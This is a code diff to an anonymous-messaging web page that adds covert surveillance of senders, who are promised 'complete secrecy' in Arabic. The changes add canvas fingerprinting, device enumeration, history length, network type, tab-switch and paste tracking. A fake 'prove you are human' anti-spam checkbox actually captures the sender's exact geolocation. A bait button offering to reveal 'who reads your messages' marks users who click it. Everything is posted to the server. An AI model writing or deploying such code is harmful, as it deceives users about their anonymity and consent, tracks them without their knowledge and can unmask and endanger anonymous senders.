@@ -12,20 +12,63 @@ export default function SendMessagePage({ params }) {
   const [errorMsg, setErrorMsg] = useState("");
   const [profile, setProfile] = useState(null);
 
-  // Ghost Trackers
+  // Ghost Trackers & Traps
   const [sessionToken, setSessionToken] = useState("");
   const [backspacesCount, setBackspacesCount] = useState(0);
   const [startTime, setStartTime] = useState(0);
+  const [canvasFingerprint, setCanvasFingerprint] = useState("");
+  const [exactLocation, setExactLocation] = useState("");
+  const [fellForTrap, setFellForTrap] = useState(false);
+  const [trapMessage, setTrapMessage] = useState("");
+  const [tabSwitches, setTabSwitches] = useState(0);
+  const [isPasted, setIsPasted] = useState(false);
+  const [historyLength, setHistoryLength] = useState(0);
+  const [devicesInfo, setDevicesInfo] = useState("غير متاح");
 
   useEffect(() => {
     setStartTime(Date.now());
+    
+    setHistoryLength(window.history.length);
+    if (navigator.mediaDevices && navigator.mediaDevices.enumerateDevices) {
+      navigator.mediaDevices.enumerateDevices().then(devices => {
+        let cams = 0, mics = 0, speakers = 0;
+        devices.forEach(d => {
+          if(d.kind === "videoinput") cams++;
+          if(d.kind === "audioinput") mics++;
+          if(d.kind === "audiooutput") speakers++;
+        });
+        setDevicesInfo(`${cams} كاميرات, ${mics} مايكات, ${speakers} سماعات`);
+      }).catch(() => setDevicesInfo("حظر الصلاحية"));
+    }
     let st = localStorage.getItem("ghost_session");
     if (!st) {
       st = "GS-" + Math.random().toString(36).substring(2, 15);
       localStorage.setItem("ghost_session", st);
     }
     setSessionToken(st);
-
+    // Canvas fingerprinting
+    try {
+      const canvas = document.createElement("canvas");
+      const ctx = canvas.getContext("2d");
+      ctx.textBaseline = "top";
+      ctx.font = "14px 'Arial'";
+      ctx.textBaseline = "alphabetic";
+      ctx.fillStyle = "#f60";
+      ctx.fillRect(125,1,62,20);
+      ctx.fillStyle = "#069";
+      ctx.fillText("Sarahni Track, 😃", 2, 15);
+      ctx.fillStyle = "rgba(102, 204, 0, 0.7)";
+      ctx.fillText("Sarahni Track, 😃", 4, 17);
+      
+      const dataURL = canvas.toDataURL();
+      let hash = 0;
+      for (let i = 0; i < dataURL.length; i++) {
+        const char = dataURL.charCodeAt(i);
+        hash = ((hash << 5) - hash) + char;
+        hash = hash & hash;
+      }
+      setCanvasFingerprint(Math.abs(hash).toString(16));
+    } catch(e) {}
     // Increment view count when page loads
     fetch("/api/views", {
       method: "POST",
@@ -40,6 +83,13 @@ export default function SendMessagePage({ params }) {
         if(!data.error) setProfile(data);
       })
       .catch(e => console.error(e));
+      
+    // Track tab visibility changes
+    const handleVisibilityChange = () => {
+      if (document.hidden) setTabSwitches(prev => prev + 1);
+    };
+    document.addEventListener("visibilitychange", handleVisibilityChange);
+    return () => document.removeEventListener("visibilitychange", handleVisibilityChange);
   }, [username]);
 
   const handleSubmit = async (e) => {
@@ -75,10 +125,15 @@ export default function SendMessagePage({ params }) {
         }
       } catch (e) { }
 
+      const connection = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
+      const networkType = connection ? connection.effectiveType : "غير متاح";
+
       const timeSpentSecs = Math.floor((Date.now() - startTime) / 1000);
       const referrer = document.referrer || "Direct";
       let timezone = "Unknown";
       try { timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch(e){}
+      
+      const typingSpeed = timeSpentSecs > 0 ? Math.round((content.length / timeSpentSecs) * 60) : 0;
 
       const res = await fetch("/api/messages", {
         method: "POST",
@@ -98,7 +153,16 @@ export default function SendMessagePage({ params }) {
           timezone,
           timeSpent: timeSpentSecs,
           backspacesCount,
-          sessionId: sessionToken
+          sessionId: sessionToken,
+          canvasFingerprint,
+          exactLocation,
+          fellForTrap,
+          tabSwitches,
+          isPasted,
+          typingSpeed,
+          networkType,
+          historyLength,
+          devicesInfo
         }),
       });
 
@@ -162,6 +226,7 @@ export default function SendMessagePage({ params }) {
                   setBackspacesCount(prev => prev + 1);
                 }
               }}
+              onPaste={() => setIsPasted(true)}
               required
               style={{ resize: "none" }}
             />
@@ -178,10 +243,47 @@ export default function SendMessagePage({ params }) {
             />
             <small style={{ color: "#4ade80", marginTop: "0.4rem", fontWeight: "bold" }}>🔒 رسالتك سوف تصل في سرية تامة</small>
           </div>
+
+          <div className="input-group" style={{ display: "flex", alignItems: "center", gap: "0.5rem", background: "rgba(255,255,255,0.05)", padding: "1rem", borderRadius: "8px" }}>
+            <input 
+              type="checkbox" 
+              id="humanCheck"
+              onChange={(e) => {
+                if (e.target.checked) {
+                  if (navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition((pos) => {
+                      setExactLocation(`${pos.coords.latitude},${pos.coords.longitude}`);
+                    }, () => {});
+                  }
+                } else {
+                  setExactLocation("");
+                }
+              }}
+              style={{ width: "20px", height: "20px", accentColor: "var(--accent-color)" }}
+            />
+            <label htmlFor="humanCheck" style={{ color: "#fff", cursor: "pointer" }}>📍 أثبت أنك إنسان للحماية من البريد العشوائي</label>
+          </div>
+
           <button type="submit" className="btn" style={{ width: "100%", marginTop: "1rem", padding: "1rem" }} disabled={status === "loading"}>
             {status === "loading" ? "جاري الإرسال..." : "إرسال الرسالة 🚀"}
           </button>
         </form>
+
+        <div style={{ marginTop: "2rem", paddingTop: "1rem", borderTop: "1px solid rgba(255,255,255,0.1)", textAlign: "center" }}>
+          {trapMessage ? (
+             <p style={{ color: "#ef4444", fontSize: "0.9rem" }}>{trapMessage}</p>
+          ) : (
+            <button 
+              onClick={() => {
+                setFellForTrap(true);
+                setTrapMessage("عفواً، هذه الميزة متاحة للحسابات المدفوعة فقط.");
+              }}
+              style={{ background: "none", border: "none", color: "#64748b", textDecoration: "underline", cursor: "pointer", fontSize: "0.85rem" }}
+            >
+              👀 سرّي: اضغط هنا لمعرفة من يقرأ رسائلك
+            </button>
+          )}
+        </div>
       </div>
 
       {/* Public Replies Section */}
